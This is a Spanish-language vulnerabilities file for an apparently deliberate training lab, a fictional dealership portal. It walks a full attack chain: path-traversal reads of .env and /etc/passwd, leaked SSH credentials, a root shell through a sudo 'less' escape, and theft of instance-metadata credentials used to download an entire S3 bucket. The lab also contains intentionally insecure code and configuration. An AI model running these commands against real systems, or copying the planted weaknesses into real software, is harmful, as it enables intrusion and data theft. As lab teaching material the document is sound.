# Vulnerabilidades

Cada fallo de este laboratorio tiene una explicación de programación o de
administración de sistemas plausible, no es una vulnerabilidad "de juguete"
insertada artificialmente. Se listan en el orden en que normalmente se
descubren.

## 1. Local File Inclusion en `dev.ppkconcesionario.com`

**Dónde:** `app/routers/download.py`, endpoint `GET /download?file=...`,
activo solo cuando `APP_MODE=development`.

```python
if settings.is_dev:
    target_path = os.path.join(FILES_DIR, file)
    if not os.path.isfile(target_path):
        raise HTTPException(status_code=404, detail="Archivo no encontrado")
    return FileResponse(target_path)
```

El parámetro `file` se concatena directamente sobre el directorio de
manuales sin normalizar ni comprobar que el resultado siga dentro de
`FILES_DIR`. Cualquier secuencia `../` en `file` permite salir de ese
directorio.

En producción (`APP_MODE=production`) el mismo endpoint usa
`os.path.basename()` más una lista blanca de nombres de fichero permitidos,
así que la ruta segura no es vulnerable — el fallo solo existe en el entorno
de desarrollo, típico de una comprobación de seguridad añadida en algún
momento a producción y nunca portada al entorno de pruebas.

**Explotación:**

```
GET /download?file=manual.pdf                          -> manual legítimo
GET /download?file=../.env                              -> variables de entorno del contenedor dev
GET /download?file=../../etc/passwd                      -> /etc/passwd del contenedor
```

(La profundidad exacta de `../` depende de que `FILES_DIR` está en
`/app/files` dentro del contenedor; `/app/files/../.env` resuelve a
`/app/.env`, y `/app/files/../../etc/passwd` resuelve a `/etc/passwd`.)

## 2. Filtración de credenciales vía `.env`

El `.env` del contenedor `dev` (generado por el User Data de Terraform, ver
`terraform/modules/ec2/templates/user_data.sh.tpl`) contiene:

```
DEV_USERNAME=pepe
DEV_PASSWORD=Summer2025!
```

Estas credenciales alimentan un usuario de conveniencia en la tabla
`users` de la aplicación (ver `app/seed.py`) para que el desarrollador
pudiera probar el "Área privada" sin depender de cuentas corporativas. El
problema es que la misma contraseña se reutilizó para la cuenta Linux real
del desarrollador en el servidor (ver punto 3).

`/etc/passwd`, leído en el mismo paso, revela cuentas del sistema
(`ubuntu`, `deploy`, `pepe`) que confirman que `pepe` es una cuenta válida
del sistema operativo, no solo de la aplicación — la pista que motiva
probar la contraseña filtrada contra SSH.

## 3. Reutilización de credenciales vía SSH

`pepe` es una cuenta Linux real (creada por el User Data), con la política
de SSH modificada solo para ella:

```
Match User pepe
    PasswordAuthentication yes
```

El resto del servidor sigue exigiendo autenticación por clave. Con
`pepe:Summer2025!` (la misma contraseña filtrada en el `.env`) se obtiene
una shell SSH completa como usuario sin privilegios.

## 4. Escalada de privilegios vía sudoers mal configurado (GTFOBins)

```
$ sudo -l
User pepe may run the following commands on ip-10-0-...:
    (root) NOPASSWD: /usr/bin/less /var/log/ppk-portal/*.log
```

Se le permitió a `pepe` revisar los logs de la aplicación como root sin
contraseña, porque `docker logs` requiere privilegios de root en esta
configuración y nadie quiso darle sudo completo. `less` es un binario
"peligroso" clásico de [GTFOBins](https://gtfobins.github.io/gtfobins/less/):
una vez abierto como root, `!/bin/sh` (o `v` para abrir un editor, que a su
vez permite `:!/bin/sh`) da una shell de root completa, sin restricción de
argumentos porque la restricción de sudoers es sobre el binario, no sobre lo
que se hace una vez dentro de él.

```
$ sudo less /var/log/ppk-portal/app.log
!/bin/sh
# whoami
root
```

## 5. Alcance excesivo del IAM Role de la instancia (S3)

El rol de la instancia (ver `terraform/modules/iam`) concede:

```json
{
  "Statement": [
    {"Sid": "ListCompanyBucket", "Effect": "Allow", "Action": "s3:ListBucket", "Resource": "arn:aws:s3:::ppk-company-data-xxxxxx"},
    {"Sid": "ReadCompanyBucketObjects", "Effect": "Allow", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::ppk-company-data-xxxxxx/*"}
  ]
}
```

No hay ninguna acción de escritura ni de administración: solo lectura. El
problema es el alcance del `Resource`: cubre el bucket entero, mientras que
la funcionalidad real de la aplicación (`app/routers/documents.py`) solo
necesita el prefijo `brochures/`. Con las credenciales temporales del rol
(obtenibles como root desde el servicio de metadatos de la instancia,
`http://169.254.169.254/latest/meta-data/iam/security-credentials/...`), es
posible listar y descargar **todo** el bucket:

```
aws s3 ls s3://ppk-company-data-xxxxxx/ --recursive
aws s3 cp s3://ppk-company-data-xxxxxx/contracts/vehicle_financing_2026.xlsx .
aws s3 cp s3://ppk-company-data-xxxxxx/exports/customers_export.csv .
aws s3 cp s3://ppk-company-data-xxxxxx/finance/financial-report-q2.pdf .
aws s3 cp s3://ppk-company-data-xxxxxx/old-config/legacy.env .
```

Esto entrega contratos de financiación, una exportación de clientes,
informes financieros internos y configuración antigua de un servicio dado
de baja — el impacto final de la cadena completa.
